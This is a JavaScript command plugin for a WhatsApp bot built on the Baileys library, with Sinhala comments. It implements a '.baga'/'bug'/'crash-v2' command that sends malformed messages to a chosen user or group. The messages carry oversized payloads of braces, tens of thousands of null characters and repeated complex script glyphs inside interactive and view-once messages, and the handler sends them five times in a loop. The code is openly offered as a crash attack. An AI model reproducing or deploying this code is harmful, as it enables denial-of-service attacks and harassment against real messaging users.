const { cmd } = require('../command');
const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');

// ---------------------- Helper ---------------------- //
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ====================== BUG FUNCTIONS ====================== //

async function InvisibleFC(target, conn) {
    try {
        let message = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: { title: "KenokYou!", hasMediaAttachment: false },
                        body: { text: "KenokYou!" },
                        nativeFlowMessage: { messageParamsJson: "{".repeat(10000) },
                        contextInfo: { participant: target, mentionedJid: [target] },
                    },
                },
            },
        };
        await conn.relayMessage(target, message, { participant: { jid: target } });
    } catch (e) { console.error("InvisibleFC Error:", e.message); }
}

async function RizzKenok(target, conn) {
    try {
        const crash_val = "\u0000".repeat(50000);
        const bug_char = "జ్ఞ‌ා".repeat(5000);
        await conn.relayMessage(target, {
            viewOnceMessageV2: {
                message: {
                    interactiveMessage: {
                        header: { title: "🩸", hasMediaAttachment: false },
                        body: { text: "⌁⃰Hahaha\n" + bug_char },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "payment_method", buttonParamsJson: crash_val },
                                { name: "single_select", buttonParamsJson: crash_val }
                            ]
                        },
                        contextInfo: { mentionedJid: [target] }
                    }
                }
            }
        }, { participant: { jid: target } });
    } catch (e) { console.error("RizzKenok Error:", e.message); }
}

// ====================== COMMAND HANDLER ====================== //

cmd({
    pattern: "baga",
    alias: ["bug", "crash-v2"],
    react: "🧬",
    desc: "Multi-JID Supported Bug Command",
    category: "main",
    filename: __filename
},
async (conn, mek, m, { from, text, reply, command }) => {
    try {
        let target = "";

        // 1. කෙලින්ම JID එකක් දුන්නොත් (Text)
        if (text && text.includes('@')) {
            target = text.trim();
        } 
        // 2. කෙනෙක්ව Tag කරලා තිබුණොත්
        else if (m.mentionedJid && m.mentionedJid[0]) {
            target = m.mentionedJid[0];
        } 
        // 3. Message එකකට Reply කරලා තිබුණොත්
        else if (m.quoted) {
            target = m.quoted.sender || m.quoted.participant || m.quoted.key.remoteJid;
        } 
        // 4. අංකයක් පමණක් දුන්නොත්
        else if (text) {
            target = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        }

        // Target එකක් නැතිනම්
        if (!target || target === "") {
            return reply("❌ *Target JID එකක් ලබා දෙන්න!*\n\n*උදාහරණ:*\n.baga 120363xxx@g.us\n.baga 9476xxx@s.whatsapp.net\n.baga (reply to message)");
        }

        // React & Information
        await conn.sendMessage(from, { react: { text: "🩸", key: mek.key } });
        console.log(`[BUG STARTED] Target: ${target}`);

        // Attack Loops (බෝට් එකේ ස්ථාවරත්වය සඳහා loop 5ක් දමා ඇත)
        for (let i = 0; i < 5; i++) {
            await InvisibleFC(target, conn);
            await sleep(1500);
            await RizzKenok(target, conn);
            console.log(`[BUG SENT] Loop: ${i+1} to ${target}`);
        }

        await conn.sendMessage(from, { react: { text: "✅", key: mek.key } });
        return reply(`✅ *Bug successfully sent to:*\n${target}`);

    } catch (e) {
        console.error("Baga Error:", e);
        reply("⚠️ Bug Error: " + e.message);
    }
});
